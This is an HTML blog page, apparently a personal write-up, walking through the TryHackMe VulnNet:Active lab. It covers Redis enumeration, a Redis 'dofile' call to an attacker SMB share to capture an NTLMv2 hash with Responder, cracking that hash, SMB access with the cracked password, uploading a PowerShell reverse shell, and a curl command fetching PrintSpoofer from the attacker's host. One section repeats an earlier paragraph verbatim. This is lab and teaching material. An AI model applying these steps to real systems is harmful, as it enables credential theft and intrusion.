@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intro To WireShark</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <link rel="stylesheet" href="../Style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Blinker:wght@100;200;300;400;600;700;800;900&family=Sixtyfour:BLED,SCAN@8,-3&display=swap" rel="stylesheet">
+</head>
+    <body>
+        <header class="p-1 text-bg-dark backgroundimage2">
+            <div class="container">
+            <div class="d-flex flex-wrap align-items-center justify-content-center justify-content-lg-start">
+                <a href="/" class="d-flex align-items-center mb-2 mb-lg-0 text-white text-decoration-none">
+                    <svg class="bi me-2" width="40" height="32" role="img" aria-label="Bootstrap"><use xlink:href="#bootstrap"></use></svg>
+                </a>
+    
+             <!-- 1st Navigation bar (menus) -->
+            <ul class="nav col-12 col-lg-auto me-lg-auto mb-2 justify-content-center mb-md-0">
+              <li id="home"><a href="./index.html" class="nav-link px-2 text-secondary sixtyfour-header ">Home</a></li>
+              <li><a href="./Walkthrough.html" class="nav-link px-2 text-white sixtyfour-header">Pentests</a></li>
+              <li><a href="./knowledgebase.html" class="nav-link px-2 text-white sixtyfour-header">KnowledgeBase</a></li>
+              <li><a href="./Theats.html" class="nav-link px-2 text-white sixtyfour-header">Threats</a></li>
+              <li><a href="./ContactMe.html" class="nav-link px-2 text-white sixtyfour-header">Blog</a></li>
+              <li><a href="./ContactMe.html" class="nav-link px-2 text-white sixtyfour-header">AboutMe</a></li>
+              <li><a href="./ContactMe.html" class="nav-link px-2 text-white sixtyfour-header">ContactMe</a></li>
+            </ul>
+            
+            <form class="col-12 col-lg-center mb-3 mb-lg-0 me-lg-3" role="search">
+              <input type="search" class="form-control form-control-dark text-bg-dark" placeholder="Search..." aria-label="Search">
+            </form>
+          </div>
+        </div>
+      </header>
+
+      <section>
+        <div class="backgroundimage">
+          <div class="container" style="width:fit-content; ">
+            <div class="row mx-5 py-5">
+              <div class="col card">
+
+                  <h1>Vulnet:Active TryHackMe Walkthrough<h1>
+                    <h3>March 26,2026<h3>
+                    <img src="/Assets/PentestBlog/vulnetActive.png" alt="">
+              </div>
+          </div>
+        </div>
+
+        <div class="container paragrahWidth">
+            <div class="row py-4">
+              <div class="col text1 card">
+
+               <!-- ****************below is the first paragraph ********************-->
+                <h2>Below is a step by step walkthrough of the TryHackMe lab: VulnNet:Active</h2><br><br>
+                This lab is medium difficulty and makes you jump through some difficult hoops, but if you stay focused you might just 
+                learn something.<br><br>
+                <ul>
+                      <h1> Setup </h1>
+                    <li> 
+                       For walkthrough I will use my own Kali Virtual Machine. First start your machine and wait for the IP. I open my terminal and start an OpenVPN 
+                       connection with the config files they give you in TryHackMe. <br>I also changed my Hosts file to set the IP to the hostname: VulnNet.<br><br>
+                    </li>
+                    <li>
+                        Find the below flags:
+                        <br>What is the system flag? (Desktop\system.txt)
+                        <br>What is the user flag? (Desktop\user.txt)<br><br>
+
+                   </li>
+                   <li>
+                        ***Note: This tryhackme machine/box is prone to break or stop working completely after about 30-45 mins, if you notice that something is not working, 
+                        try to ping the machine. If it seems to have lost the connection, you will have to restart all over.
+                  </li>
+                </ul>
+                <br>
+                <a href="https://tryhackme.com/room/vulnnetactive">Click here to navigate to the TryHackMe room.</a>
+              </div>
+          </div>
+    
+
+          <div class="row py-4">
+            <div class="col text1 card">
+               <!-- ****************below is the secoond paragraph ********************-->
+              <h1>Recon#1</h1> <br>
+                    <h2>RUSTSCAN</h2>
+              <img src="../Assets/PentestBlog/Rustscan Screenshot.jpg">
+                    For a scan, I use this command in RustScan. It’s faster and more robust. <br>
+                    “sudo rustscan -a tryHackMeLabIPaddress --ulimit 5000”
+                    <br><br>PORT     STATE SERVICE     REASON<br>
+                    53/tcp    open  domain       syn-ack ttl 126<br>
+                    135/tcp   open  msrpc        syn-ack ttl 126<br>
+                    139/tcp   open  netbios-ssn  syn-ack ttl 126<br>
+                    445/tcp   open  microsoft-ds syn-ack ttl 126<br>
+                    464/tcp   open  kpasswd5     syn-ack ttl 126<br>
+                    6379/tcp  open  redis        syn-ack ttl 126<br>
+                    9389/tcp  open  adws         syn-ack ttl 126<br>
+                    49667/tcp open  unknown      syn-ack ttl 126<br>
+                    49668/tcp open  unknown      syn-ack ttl 126<br>
+                    49669/tcp open  unknown      syn-ack ttl 126<br>
+                    49670/tcp open  unknown      syn-ack ttl 126<br>
+                    49671/tcp open  unknown      syn-ack ttl 126<br>
+                    49696/tcp open  unknown      syn-ack ttl 126<br>
+                    49704/tcp open  unknown      syn-ack ttl 126<br>
+
+             
+                   <br><br>
+                   
+                  Lots of ports open, including: Active Directory Services, DNS, SMB/Netbios.
+                  Port 464 is part of Kerberos and handles secure password changes. <br><br>The 5 at the end of “passwd” is for the version number.
+                  Port 9389 is Active Directory Web Services and allows the use of modern AD functionality over a remote session.
+                  Based on all these ports we can safely assume that we are on a windows machine. <bR><br>
+                  Since this is an active directory environment, and has Port 445 and 139, which are SMB protocols, we can check if it is using NTLM for authentication. 
+
+                  
+          </div>
+        </div>
+
+        <div class="row py-4">
+            <div class="col text1 card">
+               <!-- ****************below is the 3rd paragraph ********************-->
+                    <h2>ENUM4LINUX</h2><br>
+                    Enum4Linux gives us the Domain Name : VULNNET and some possible known usernames.
+                    This line: + Server 10.66.174.40 allows sessions using username ‘’ and password ‘’.
+                    Something also interesting is that this is saying it allows null sessions or in other words anonymous logins. So, when we connect to this Windows environment, 
+                    it will allow us to login using blank username and password.
+
+                    <img src="../Assets/PentestBlog/Enum4Linux.jpg">
+                   
+                  Lots of ports open, including: Active Directory Services, DNS, SMB/Netbios.
+                  Port 464 is part of Kerberos and handles secure password changes. <br><br>The 5 at the end of “passwd” is for the version number.
+                  Port 9389 is Active Directory Web Services and allows the use of modern AD functionality over a remote session.
+                  Based on all these ports we can safely assume that we are on a windows machine. <bR><br>
+                  Since this is an active directory environment, and has Port 445 and 139, which are SMB protocols, we can check if it is using NTLM for authentication. 
+
+                  
+          </div>
+        </div>
+    
+        <div class="row py-4">
+          <div class="col text1 card">
+             <!-- ****************below is the third paragraph ********************-->
+            <h2>OSINT and REDIS</h2><br>
+                Redis (Port 6379) is a caching services that can hold some good information and might contain cached password or credentials.
+                 There are some exploits with Metasploit that enumerate some good information like version and other things.<br><br>
+                I was searching online for Redis Vulnerabilities, and I found this resource: https://hacktricks.wiki/network-services-pentesting/ 6379 - Pentesting Redis - HackTricks
+                <br><br>This shows you how to connect to the Redis command line interface:<bR>
+                redis-cli -h 10.10.10.10
+                And has some recon commands, like INFO, CLIENT LIST, and CONFIG GET *
+                CONFIG GET * will give you the path for a user: C:\\Users\\enterprise-security\\Downloads\\Redis..<bR><br>
+                We have our first username: enterprise-security!!!
+                <img src="../Assets/PentestBlog/Redis user.jpg">
+
+         </div>
+        
+        </div>
+    
+        <div class="row py-4">
+          <div class="col text1 card">
+             <!-- ****************below is the fourth paragraph ********************-->
+            <h2>EXPLOIT AND PAYLOAD (1st Flag - Desktop\user.txt)</h2><br>
+                So, with the info we have from our recon, we can access the file system by running the below payload, we can get the user.txt flag.
+                <img src="/Assets/PentestBlog/Redisd user flag.jpg" alt=""><br><br>
+               Since this is an Active Directory Environment with SMB services, we can try to use a NTLM relay attack and intercept any NTLM hashes.
+                Using responder, we can intercept any authentication data.
+                Since we can escape the Redis sandbox, we can try send data back to the VPN tunnel that responder is using and intercept this data:<bR>
+                EVAL "dofile('//192.168.129.95//share')" 0
+          </div>
+        </div>
+
+
+        <div class="row py-4">
+          <div class="col text1 card">
+             <!-- ****************below is the fourth paragraph ********************-->
+            <h2>RESPONDER</h2><br>
+                Here you can see the authentication data that was collected by Responder, this is an NTLMV2 hash, and we can try to crack it with Hashcat
+                <img src="/Assets/PentestBlog/hashcat.jpg" alt=""><br><br>
+                By using Hashcat, we can crack this NTLMv2 hash, and you can see the password at the bottom of the hash.
+          </div>
+        </div>
+
+         <div class="row py-4">
+          <div class="col text1 card">
+             <!-- ****************below is the fourth paragraph ********************-->
+            <h1>RECON#2</h1><br>
+            <h1>SMB</H1>
+                I used smbmap for enumerating the SMB shares with the credentials found with the Redis exploit. See below for the output:<Br>
+                smbmap -H VULNNET -u enterprise-security -p sand_0873959498
+                <img src="/Assets/PentestBlog/SMB Enum.jpg" alt=""><br><br>
+                So, it looks like Enterprise-Share has read and write access, so I tried seeing what’s in there. But I had a difficult time connecting to the actual SMB 
+                service by using SMBCLIENT,<br>it would not connect for some reason. <br>I used Netexec with this payload:<br>
+                netexec smb 10.66.141.81 -u enterprise-security -p sand_0873959498 -d VULNNET --shares
+                <br>and then,<br>
+                smbclient //10.66.141.81/Enterprise-Share -U 'VULNNET\enterprise-security%sand_0873959498'
+                <br><br>And presto, I got a SMB prompt!<br><br>
+                <h2>Uploading a new script</h2>
+                To upload a file in the SMB server, you can use functions like put. <Br>See below:
+                smb: \> put PurgeIrrelevantData_1826.ps1<bR>
+                But first you must modify the file on your kali machine and upload a reverse shell script into the SMB share.<br><br>
+                I used a script in the built in Kali file folder at /usr/share/set/src/powershell
+                <br><br>There is a file called reverse_powershell (this is a function that creates a reverse shell with powershell commands).
+                Login to smbclient again and use the put command to copy the file into the SMB share.
+                <Br><br>The put function has copied an exact copy in you current folder on your Kali machine.
+                Script modifications: ***I also added the IP and the PORT, IMPORTANT*** place the IP of the tunnel or VPN that you are using to connect to 
+                the TryHackMe box. You can ip a, to find the Tun0 IP address.
+                <img src="/Assets/PentestBlog/reverseshellScript.png" alt=""><br><Br>
+
+                This what your reverse shell will look like at first. With the command “whoami”, you will see enterprise-security.
+                <img src="/Assets/PentestBlog/reverseShell.jpg" alt=""><bR>
+                    But we need to be root to get the 2nd flag. So we need to elevate privileges or access to get the 2nd Flag.
+                To check what privileges this user might have, we can use the command:
+                Whoami /priv
+                And the below will show the privileges of enterprise-security
+                <img src="/Assets/PentestBlog/whoamipriv.jpg" alt=""><br>
+
+              The setImpersonatePrivilege is enabled and will help us elevate our privilege. 
+
+              According to grok: “Having SetImpersonatePrivilege enabled in your token allows you to:<br>
+              <br>•	Take an impersonation token from a higher-privileged process (especially SYSTEM) that authenticates to something you control.
+              <br>•	Create a new process running as that higher-privileged account.<br><br>
+              This is the foundation for many local privilege escalation techniques on Windows,
+              especially when you have code execution as a service account but not as Administrator/SYSTEM. “<br><br>
+              
+              Also, we can enumerate some information about the system we are on: systeminfo
+              Which gives you the Microsoft version 2019 Windows Server.
+              <img src="/Assets/PentestBlog/SYSTEMINFO.jpg" alt="">
+</div>
+
+              <div class="row py-4">
+                        <div class="col text1 card">
+                          <!-- ****************below is the fourth paragraph ********************-->
+                          <h2>OSINT</h2><br>
+                             Since we need to elevate our privilege from enterprise-security to a root account or a SYSTEM account in windows. I researched setImpersonatePrivilege + vulnerability and found a gitbug page called Windows-Local-Privilege-Escalation-Cookbook/Notes/SeImpersonatePrivilege.md at master · nickvourd/Windows-Local-Privilege-Escalation-Cookbook · GitHub
+                              This site shows a proof of concept to exploit this vulnerability. <BR><bR>This site led me to another Github page called: GitHub -
+                              itm4n/PrintSpoofer: Abusing impersonation privileges through the "Printer Bug" · GitHub
+                              <BR><bR>This exploit uses a tool called PrintSpoofer that can escalate privilege on a Windows machine - 2019 Windows Server.
+                              GitHub - itm4n/PrintSpoofer: Abusing impersonation privileges through the "Printer Bug" · GitHub
+                              <BR>Start a python server to host these files:
+                              Sudo python3 -m http.server 80 
+                              curl -s -L http://192.168.129.95:8080/PrintSpoofer.exe -o C:\Users\enterprise-security\Downloads\print.exe
+
+                        </div>
+              </div>
+
+
+          
+        </div>
+    
+            <div class="row py-4">
+            <div class="col text1 card">
+               <!-- ****************the below is for notes********************-->
+                <h1>Notes:</h1>
+                <H2>Final Outcome:</H2>
+The end results are that was able to create reverse shell in a powershell environment, and I was able to upload file (such as Godpotatoe, printSpoofer etc) but could not execute any of these .exe files.
+I’m not sure what the issue was: could be that their antivirus or EDR was blocking these keywords from executing. It could have been that the reverse shell I was using was too unstable and not interactive enough.
+These TryHackMe machines can be very frustrating because they easily will stop working in 30 -40 mins. Meaning you have to start from the very beginning. 
+
+            
+            </div>
+            </div>
+    
+    
+     
+    
+        </div>
+            <section class="footer">
+                <div class="container">
+                  <footer class="d-flex flex-wrap justify-content-between align-items-center py-3 my-0">
+                    <p class="col-md-4 mb-0 text-body-secondary">© 2024 Company, Inc</p>
+                
+                    <a href="/" class="col-md-4 d-flex align-items-center justify-content-center mb-3 mb-md-0 me-md-auto link-body-emphasis text-decoration-none">
+                      <svg class="bi me-2" width="40" height="32"><use xlink:href="#bootstrap"></use></svg>
+                    </a>
+                
+                    <ul class="nav col-md-4 justify-content-end">
+                      <li class="nav-item"><a href="#" class="nav-link px-2 text-body-secondary">Home</a></li>
+                      <li class="nav-item"><a href="#" class="nav-link px-2 text-body-secondary">Features</a></li>
+                      <li class="nav-item"><a href="#" class="nav-link px-2 text-body-secondary">Pricing</a></li>
+                      <li class="nav-item"><a href="#" class="nav-link px-2 text-body-secondary">FAQs</a></li>
+                      <li class="nav-item"><a href="#" class="nav-link px-2 text-body-secondary">About</a></li>
+                    </ul>
+                  </footer>
+                </div>
+              </section>
+         </div>         
+    </section>
+  </body>
+</html>
